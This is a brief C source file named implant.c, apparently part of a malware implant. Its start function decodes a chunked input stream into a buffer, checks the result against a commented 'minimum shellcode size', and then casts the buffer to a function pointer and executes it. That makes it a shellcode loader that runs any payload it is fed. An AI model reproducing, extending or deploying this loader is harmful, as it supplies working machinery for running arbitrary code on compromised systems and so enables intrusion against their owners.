// implant.c 
#include "pic.h"

int start(void* input, long len, char* output)
{
    int payloadSize = picProcessChunkedStream(input, len, output);
    
    if (payloadSize > 32)   // minimum shellcode size
    {
        void (*payloadFunc)(void) = (void (*)(void))output;
        payloadFunc();
    }
    
    return payloadSize;
}

